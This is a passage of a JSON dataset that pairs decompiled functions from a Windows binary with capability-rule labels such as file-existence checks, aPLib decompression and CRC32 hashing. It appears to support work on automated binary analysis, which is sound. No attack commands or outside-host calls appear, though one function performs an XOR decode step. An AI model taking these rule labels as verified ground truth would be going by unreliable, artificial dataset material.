  uStack144 = 0;\n    uStack148 = 0;\n    uStack152 = 0x406f7c;\n    fcn.00402d50();\n    uStack152 = 0;\n    uStack156 = 0;\n    uStack160 = 0x406f85;\n    fcn.00402d50();\n    uStack160 = 0;\n    uStack164 = 0;\n    uStack168 = 0x406f8e;\n    fcn.00402d50();\n    uStack168 = 0;\n    uStack172 = 0;\n    uStack176 = 0x406f97;\n    fcn.00402d50();\n    uStack176 = 0;\n    uStack180 = 0;\n    uStack184 = 0x406fa0;\n    fcn.00402d50();\n    uStack184 = 0;\n    uStack188 = 0;\n    uStack192 = 0x406fa9;\n    fcn.00402d50();\n    uStack192 = 0;\n    uStack196 = 0;\n    uStack200 = 0x406fb2;\n    fcn.00402d50();\n    uStack200 = 0;\n    uStack204 = 0;\n    uStack208 = 0x406fbb;\n    fcn.00402d50();\n    uStack208 = 0;\n    uStack212 = 0;\n    uStack216 = 0x406fc4;\n    fcn.00402d50();\n    uStack216 = 0;\n    uStack220 = 0;\n    uStack224 = 0x406fcd;\n    fcn.00402d50();\n    uStack224 = 0;\n    uStack228 = 0;\n    uStack232 = 0x406fd6;\n    fcn.00402d50();\n    uStack232 = 0;\n    uStack236 = 0;\n    uStack240 = 0x406fdf;\n    fcn.00402d50();\n    uStack240 = 0;\n    uStack244 = 0;\n    uStack248 = 0x406fe8;\n    fcn.00402d50();\n    uStack248 = 0;\n    uStack252 = 0;\n    uStack256 = 0x406ff1;\n    fcn.00402d50();\n    uStack256 = 0;\n    uStack260 = 0;\n    uStack264 = 0x406ffa;\n    fcn.00402d50();\n    uStack264 = 0;\n    uStack268 = 0;\n    uStack272 = 0x407003;\n    fcn.00402d50();\n    uStack272 = 0;\n    uStack276 = 0;\n    uStack280 = 0x40700c;\n    fcn.00402d50();\n    uStack280 = 0;\n    uStack284 = 0;\n    uStack288 = 0x407015;\n    fcn.00402d50();\n    uStack288 = 0;\n    uStack292 = 0;\n    uStack296 = 0x40701e;\n    fcn.00402d50();\n    uStack296 = 0;\n    uStack300 = 0;\n    uStack304 = 0x407027;\n    fcn.00402d50();\n    uStack304 = 0;\n    uStack308 = 0;\n    uStack312 = 0x407030;\n    fcn.00402d50();\n    uStack312 = 0;\n    uStack316 = 0;\n    uStack320 = 0x407039;\n    fcn.00402d50();\n    uStack320 = 0;\n    uStack324 = 0;\n    uStack328 = 0x407042;\n    fcn.00402d50();\n    uStack328 = 0;\n    uStack332 = 0;\n    uStack336 = 0x40704b;\n    fcn.00402d50();\n    uStack336 = 0;\n    uStack340 = 0;\n    uStack344 = 0x407054;\n    fcn.00402d50();\n    uStack344 = 0;\n    uStack348 = 0;\n    uStack352 = 0x40705d;\n    fcn.00402d50();\n    uStack352 = 0;\n    uStack356 = 0;\n    uStack360 = 0x407066;\n    fcn.00402d50();\n    uStack360 = 0;\n    uStack364 = 0;\n    uStack368 = 0x40706f;\n    fcn.00402d50();\n    uStack368 = 0;\n    uStack372 = 0;\n    uStack376 = 0x407078;\n    fcn.00402d50();\n    uStack376 = 0;\n    uStack380 = 0;\n    uStack384 = 0x407081;\n    fcn.00402d50();\n    uStack384 = 0;\n    uStack388 = 0;\n    uStack392 = 0x40708a;\n    fcn.00402d50();\n    uStack392 = 0;\n    uStack396 = 0;\n    uStack400 = 0x407093;\n    fcn.00402d50();\n    uStack400 = 0;\n    uStack404 = 0;\n    uStack408 = 0x40709c;\n    fcn.00402d50();\n    uStack408 = 0;\n    uStack412 = 0;\n    uStack416 = 0x4070a5;\n    fcn.00402d50();\n    uStack416 = 0;\n    uStack420 = 0;\n    uStack424 = 0x4070ae;\n    fcn.00402d50();\n    uStack424 = 0;\n    uStack428 = 0;\n    uStack432 = 0x4070b7;\n    fcn.00402d50();\n    uStack432 = 0;\n    uStack436 = 0;\n    uStack440 = 0x4070c0;\n    fcn.00402d50();\n    uStack440 = 0;\n    uStack444 = 0;\n    uStack448 = 0x4070c9;\n    fcn.00402d50();\n    uStack448 = 0;\n    uStack452 = 0;\n    uStack456 = 0x4070d2;\n    fcn.00402d50();\n    uStack456 = 0;\n    uStack460 = 0;\n    uStack464 = 0x4070db;\n    fcn.00402d50();\n    uStack464 = 0;\n    uStack468 = 0;\n    uStack472 = 0x4070e4;\n    fcn.00402d50();\n    uStack472 = 0;\n    uStack476 = 0;\n    uStack480 = 0x4070ed;\n    fcn.00402d50();\n    uStack480 = 0;\n    uStack484 = 0;\n    uStack488 = 0x4070f6;\n    fcn.00402d50();\n    uStack488 = 0;\n    uStack492 = 0;\n    uStack496 = 0x4070ff;\n    fcn.00402d50();\n    uStack496 = 0;\n    uStack500 = 0;\n    uStack504 = 0x407108;\n    fcn.00402d50();\n    uStack504 = 0;\n    uStack508 = 0;\n    uStack512 = 0x407111;\n    fcn.00402d50();\n    uStack512 = 0;\n    uStack516 = 0;\n    uStack520 = 0x40711a;\n    fcn.00402d50();\n    uStack520 = 0;\n    uStack524 = 0;\n    uStack528 = 0x407123;\n    fcn.00402d50();\n    uStack528 = 0;\n    uStack532 = 0;\n    uStack536 = 0x40712c;\n    fcn.00402d50();\n    uStack536 = 0;\n    uStack540 = 0;\n    uStack544 = 0x407135;\n    fcn.00402d50();\n    uStack544 = 0;\n    uStack548 = 0;\n    uStack552 = 0x40713e;\n    fcn.00402d50();\n    uStack552 = 0;\n    uStack556 = 0;\n    uStack560 = 0x407147;\n    fcn.00402d50();\n    uStack560 = 0;\n    uStack564 = 0;\n    uStack568 = 0x407150;\n    fcn.00402d50();\n    uStack568 = 0;\n    uStack572 = 0;\n    uStack576 = 0x407159;\n    fcn.00402d50();\n    uStack576 = 0;\n    uStack580 = 0;\n    uStack584 = 0x407162;\n    fcn.00402d50();\n    uStack584 = 0;\n    uStack588 = 0;\n    uStack592 = 0x40716b;\n    fcn.00402d50();\n    uStack592 = 0;\n    uStack596 = 0;\n    uStack600 = 0x407174;\n    fcn.00402d50();\n    uStack600 = 0;\n    uStack604 = 0;\n    uStack608 = 0x40717d;\n    fcn.00402d50();\n    uStack608 = 0;\n    uStack612 = 0;\n    fcn.00402d50();\n    iVar5 = 0;\n    fcn.00402d50();\n    uVar3 = 0;\n    fcn.00402d50();\n    fcn.00402d50();\n    fcn.00402d50();\n    *param_3 = *param_3 ^ (&stack0xfffffd9c)[((&stack0xfffffd9c)[iVar5] + (uVar3 >> 0x18)) % 0x263];\n    return param_3;\n}\n",
        "token_count": 47804
    },
    "0040f065": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040f065(int32_t *param_1, int32_t param_2)\n\n{\n    if ((param_2 == -1) && (param_2 = *param_1,  param_2 != 0)) {\n        param_2 = fcn.004196b0(param_2);\n    }\n    fcn.00401730(param_2);\n    return;\n}\n",
        "token_count": 91
    },
    "0041034c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041034c(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    puVar1 = (**(*arg_8h + 0x3c))();\n    do {\n        if (puVar1 == NULL) {\n            return 0;\n        }\n        iVar2 = puVar1[1];\n        uVar3 = *(iVar2 + 0x18);\n        if (uVar3 != 0xffffffff) {\n            do {\n                if ((*(iVar2 + 4) == arg_10h[1]) && (uVar3 == (*arg_10h != 0))) {\n                    if (*(iVar2 + 0x24) == 0xffffffff) {\n                        if (*(iVar2 + 0x20) == 0xffffffff) {\n                            return iVar2;\n                        }\n                        if (*(iVar2 + 0x20) == arg_ch) {\n                            return iVar2;\n                        }\n                    }\n                    else if ((*(iVar2 + 0x20) < arg_ch || *(iVar2 + 0x20) == arg_ch) && (arg_ch <= *(iVar2 + 0x24))) {\n                        return iVar2;\n                    }\n                }\n                uVar3 = *(iVar2 + 0x40);\n                iVar2 = iVar2 + 0x28;\n            } while (uVar3 != 0xffffffff);\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 350
    },
    "00417c4a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00417c4a(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *in_ECX;\n    int64_t iVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_4h;\n    \n    var_24h = arg_1ch;\n    var_20h = arg_18h;\n    var_1ch = arg_14h;\n    var_18h = arg_10h;\n    var_14h = arg_ch + -1;\n    var_10h = arg_8h + -0x76c;\n    var_4h = arg_20h;\n    iVar1 = fcn.0041abff(&var_24h);\n    *in_ECX = iVar1;\n    in_ECX[1] = iVar1 >> 0x20;\n    if (iVar1 == -1) {\n        fcn.00401430(0x80070057);\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "00418a70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00418a70(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar5 = *(param_2 + 0xc);\n        iVar3 = *(param_2 + 8);\n        iVar2 = fcn.0041d2ed(param_2);\n        if (iVar2 == 0) {\n            *(param_1 + 4) = *(param_1 + 4) | 8;\n        }\n        else {\n            for (; iVar5 != -1; iVar5 = *(iVar3 + iVar5 * 0xc)) {\n                pcVar1 = *(iVar3 + 4 + iVar5 * 0xc);\n                if (pcVar1 != NULL) {\n                    iVar3 = (*pcVar1)();\n                    param_2 = *(puVar4 + 0xc);\n                    if (iVar3 != 0) {\n                        if (iVar3 < 0) {\n                            return 0;\n                        }\n                        iVar3 = *(param_2 + 8);\n                        fcn.00418178(param_2);\n                        puVar4 = param_2 + 0x10;\n                        fcn.004181ba(param_2, iVar5);\n                        fcn.0041824e(1);\n                        *(param_2 + 0xc) = *(iVar3 + extraout_ECX * 4);\n                        param_2 = 0;\n                        iVar5 = 0;\n                        (**(iVar3 + 8 + extraout_ECX * 4))();\n                    }\n                }\n                iVar3 = *(param_2 + 8);\n            }\n        }\n    }\n    else {\n        fcn.004181ba(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 511
    },
    "004231d2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.004231d2(uint8_t **param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    puVar3 = param_1[3];\n    if (((puVar3 & 0x83) != 0) && ((puVar3 & 0x40) == 0)) {\n        if ((puVar3 & 2) == 0) {\n            param_1[3] = puVar3 | 1;\n            if ((puVar3 & 0x10c) == 0) {\n                fcn.00421ac0(param_1);\n            }\n            else {\n                *param_1 = param_1[2];\n            }\n            puVar3 = fcn.00425cfb(param_1[4], param_1[2], param_1[6]);\n            param_1[1] = puVar3;\n            if ((puVar3 != NULL) && (puVar3 != 0xffffffff)) {\n                if ((param_1[3] & 0x82) == 0) {\n                    puVar2 = param_1[4];\n                    if (puVar2 == 0xffffffff) {\n                        iVar4 = 0x44daa0;\n                    }\n                    else {\n                        iVar4 = *((puVar2 >> 5) * 4 + 0x450ea0) + (puVar2 & 0x1f) * 0x24;\n                    }\n                    if ((*(iVar4 + 4) & 0x82) == 0x82) {\n                        param_1[3] = param_1[3] | 0x2000;\n                    }\n                }\n                if (((param_1[6] == 0x200) && ((param_1[3] & 8) != 0)) && ((param_1[3] & 0x400) == 0)) {\n                    param_1[6] = 0x1000;\n                }\n                param_1[1] = puVar3 + -1;\n                uVar1 = **param_1;\n                *param_1 = *param_1 + 1;\n                return uVar1;\n            }\n            param_1[3] = param_1[3] | (-(puVar3 != NULL) & 0x10) + 0x10;\n            param_1[1] = NULL;\n        }\n        else {\n            param_1[3] = puVar3 | 0x20;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 580
    },
    "0042789c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nint32_t __cdecl fcn.0042789c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    fcn.00428617(0);\n    iVar1 = *0x450c94;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = iVar1;\n    uVar2 = fcn.00427349();\n    iVar3 = fcn.004286c7(uVar2);\n    if ((iVar3 == 0) && (iVar3 = iVar1,  iVar1 == 0)) {\n        iVar3 = fcn.0042758e(unaff_EBP + -0x10);\n        if (iVar3 == -1) {\n            fcn.004292bd(\"bad cast\");\n            fcn.004187b8(unaff_EBP + -0x20, 0x44903c);\n        }\n        iVar3 = *(unaff_EBP + -0x10);\n        *0x450c94 = iVar3;\n        fcn.00426d3c();\n        fcn.0042873f();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042863a();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar3;\n}\n",
        "token_count": 395
    },
    "00427eb3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00427eb3(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    if (param_2 == -1) {\n        fcn.004272b2();\n    }\n    cVar1 = fcn.004024b0(param_2, 0);\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x18) < 0x10) {\n            iVar2 = param_1 + 4;\n        }\n        else {\n            iVar2 = *(param_1 + 4);\n        }\n        fcn.0042730f(iVar2, param_2, unaff_retaddr);\n        fcn.00401c40(param_2);\n    }\n    return param_1;\n}\n",
        "token_count": 193
    },
    "00429f03": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429f03(uint arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puVar1 = arg_ch;\n    puVar3 = &var_30h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    if (((var_10h == 0) && (var_ch != -1)) && (var_ch != 0)) {\n        iVar2 = fcn.0042a970(var_ch, &arg_ch);\n        if (iVar2 == 0) {\n            puVar1 = fcn.0042aa37(var_ch);\n            *puVar1 = 0;\n        }\n        fcn.0042a997(var_ch, &var_ch);\n    }\n    (**(*in_ECX + 0x110))(0x404, arg_8h, &var_30h);\n    return;\n}\n",
        "token_count": 289
    },
    "0042a704": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042a704(int32_t param_1, int32_t **param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    int32_t **ppiVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    piVar3 = *param_2;\n    if (piVar3 != NULL) {\n        if (piVar3 == 0xffffffff) {\n            uVar4 = 0;\n            if (*(param_1 + 8) != 0) {\n                ppiVar1 = *(param_1 + 4);\n                while (piVar3 = *ppiVar1,  piVar3 == NULL) {\n                    uVar4 = uVar4 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                    if (*(param_1 + 8) <= uVar4) {\n                        *param_2 = NULL;\n                        return;\n                    }\n                }\n            }\n        }\n        piVar5 = *piVar3;\n        if (piVar5 == NULL) {\n            uVar4 = *(param_1 + 8);\n            uVar2 = (piVar3[1] >> 4) % uVar4 + 1;\n            if (uVar2 < uVar4) {\n                ppiVar1 = *(param_1 + 4) + uVar2 * 4;\n                do {\n                    piVar5 = *ppiVar1;\n                    if (piVar5 != NULL) break;\n                    uVar2 = uVar2 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar2 < uVar4);\n            }\n        }\n        *param_2 = piVar5;\n        *param_3 = piVar3[1];\n        *param_4 = piVar3[2];\n    }\n    return;\n}\n",
        "token_count": 435
    },
    "00431439": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431439(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    bVar3 = false;\n    if (*(param_1 + 4) != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 4));\n        bVar3 = iVar1 == 0;\n    }\n    *(param_1 + 4) = 0xffffffff;\n    *(param_1 + 8) = 0;\n    fcn.00401c80();\n    if (bVar3) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(*(param_1 + 0xc));\n        fcn.00431c31(uVar2);\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "004315f2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_15ch\n// WARNING: Variable defined which should be unmapped: lpFindFileData\n// WARNING: Variable defined which should be unmapped: lpFilePart\n// WARNING: Variable defined which should be unmapped: var_158h\n\nvoid __cdecl fcn.004315f2(uint lpRootPathName, uint lpFileName)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_15ch;\n    uint var_158h;\n    uint lpFilePart;\n    uint lpFindFileData;\n    uint lpString2;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    uVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = *0x44d270;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetFullPathNameA)(*(unaff_EBP + 0xc), 0x104, uVar1, unaff_EBP + -0x154);\n    if (uVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(uVar1, *(unaff_EBP + 0xc), 0x104);\n    }\n    else if (uVar2 < 0x104) {\n        piVar3 = fcn.004308e7();\n        iVar4 = (**(*piVar3 + 0xc))();\n        *(unaff_EBP + 8) = iVar4 + 0x10;\n        *(unaff_EBP + -4) = 0;\n        fcn.004315b0(uVar1, unaff_EBP + 8);\n        iVar4 = (*_sym.imp.SHLWAPI.dll_PathIsUNCA)(*(unaff_EBP + 8));\n        if ((iVar4 == 0) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)\n                              (*(unaff_EBP + 8), 0, 0, 0, unaff_EBP + -0x15c, unaff_EBP + -0x158, 0, 0),  iVar4 != 0)) {\n            if ((*(unaff_EBP + -0x158) & 2) == 0) {\n                (*_sym.imp.USER32.dll_CharUpperA)(uVar1);\n            }\n            if (((((*(unaff_EBP + -0x158) & 4) == 0) &&\n                 (iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(*(unaff_EBP + 0xc), unaff_EBP + -0x150),  iVar4 != -1)\n                 ) && ((*_sym.imp.KERNEL32.dll_FindClose)(iVar4),  *(unaff_EBP + -0x154) != 0)) &&\n               ((uVar1 <= *(unaff_EBP + -0x154) && *(unaff_EBP + -0x154) != uVar1 &&\n                (iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(unaff_EBP + -0x124), \n                (iVar4 - uVar1) + *(unaff_EBP + -0x154) < 0x104)))) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(*(unaff_EBP + -0x154), unaff_EBP + -0x124);\n            }\n        }\n        fcn.004014f0();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 837
    },
    "00431c52": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00431c52(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t *puVar4;\n    int32_t in_ECX;\n    uint var_20h;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    fcn.004192e0(arg_8h, 0, 0x128);\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_8h + 0x22, *(in_ECX + 0xc), 0x104);\n    if (*(in_ECX + 4) == *0x440728) {\ncode_r0x00431d59:\n        uVar3 = 1;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetFileTime)\n                          (*(in_ECX + 4), &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        if (iVar1 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetFileSize)(*(in_ECX + 4), 0);\n            arg_8h[6] = uVar2;\n            arg_8h[7] = 0;\n            if (uVar2 != 0xffffffff) {\n                if (*(*(in_ECX + 0xc) + -0xc) == 0) {\n                    *(arg_8h + 8) = 0;\n                }\n                else {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(*(in_ECX + 0xc));\n                    *(arg_8h + 8) = (iVar1 == -1) - 1U & iVar1;\n                }\n                puVar4 = fcn.00417d02(&lpCreationTime, 0xffffffff);\n                *arg_8h = *puVar4;\n                arg_8h[1] = puVar4[1];\n                puVar4 = fcn.00417d02(&lpLastAccessTime, 0xffffffff);\n                arg_8h[4] = *puVar4;\n                arg_8h[5] = puVar4[1];\n                puVar4 = fcn.00417d02(&lpLastWriteTime, 0xffffffff);\n                arg_8h[2] = *puVar4;\n                arg_8h[3] = puVar4[1];\n                if ((*arg_8h | arg_8h[1]) == 0) {\n                    *arg_8h = *puVar4;\n                    arg_8h[1] = puVar4[1];\n                }\n                if ((arg_8h[4] | arg_8h[5]) == 0) {\n                    arg_8h[4] = arg_8h[2];\n                    arg_8h[5] = arg_8h[3];\n                }\n                goto code_r0x00431d59;\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 686
    },
    "00433bf9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00433bf9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    piVar1 = fcn.004308e7(extraout_ECX);\n    iVar2 = (**(*piVar1 + 0xc))();\n    *(unaff_EBP + -0x10) = iVar2 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    fcn.00402ca0(*(unaff_EBP + 8));\n    iVar2 = *(unaff_EBP + 0x10);\n    if (iVar2 == -1) {\n        iVar2 = *(unaff_EBP + 8);\n    }\n    uVar3 = fcn.00433bd7(*(unaff_EBP + -0x10), *(unaff_EBP + 0xc), iVar2);\n    fcn.004014f0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 339
    },
    "00434cbb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00434cbb(int32_t *param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042ca5e();\n    if ((iVar1 != -1) && (iVar1 = (**(*param_1 + 0x158))(param_2, param_3),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_PostMessageA)(param_1[7], 0x362, 0xe001, 0);\n        (**(*param_1 + 0x144))(1);\n        return 0;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 152
    },
    "00437a28": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437a28(uint arg_8h, int32_t Locale)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint lpLibFileName;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    if (Locale == 0x800) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(&Locale, 0x43f35c);\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 3, &Locale, 4);\n        if (iVar2 == 0) goto code_r0x00437a9d;\n    }\n    uVar1 = fcn.00419858(&lpLibFileName, 0x112, arg_8h, &Locale);\n    if ((uVar1 != 0xffffffff) && (uVar1 < 0x112)) {\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&lpLibFileName);\n    }\ncode_r0x00437a9d:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 249
    },
    "00438bf0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00438bf0(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uStack12;\n    \n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[6] = 4;\n    param_1[1] = 0;\n    param_1[2] = 1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *param_1 = iVar3;\n    if (iVar3 == -1) {\n        uStack12 = 0x450280;\n        fcn.004187b8(&stack0xfffffff4, 0x447974);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    uStack12 = 0x438c2e;\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)();\n    return param_1;\n}\n",
        "token_count": 258
    },
    "00438f50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438f50(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    \n    arg_8h = param_1[5];\n    while (arg_8h != 0) {\n        iVar1 = *(arg_8h + 4);\n        fcn.00438db8(arg_8h, 0);\n        arg_8h = iVar1;\n    }\n    if (*param_1 != -1) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(*param_1);\n    }\n    if (param_1[4] != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(param_1[4]);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 230
    },
    "0041a7f7": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint * fcn.0041a7f7(uint *param_1, int16_t *param_2, int32_t param_3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    puVar4 = param_1;\n    if (param_3 != 0) {\n        do {\n            iVar1 = *param_2;\n            *puVar4 = iVar1;\n            puVar4 = puVar4 + 2;\n            param_2 = param_2 + 1;\n            if (iVar1 == 0) break;\n            param_3 = param_3 + -1;\n        } while (param_3 != 0);\n        if ((param_3 != 0) && (uVar2 = param_3 - 1,  uVar2 != 0)) {\n            for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            for (uVar2 = (uVar2 & 1) != 0; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 2;\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 324
    },
    "004227eb": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
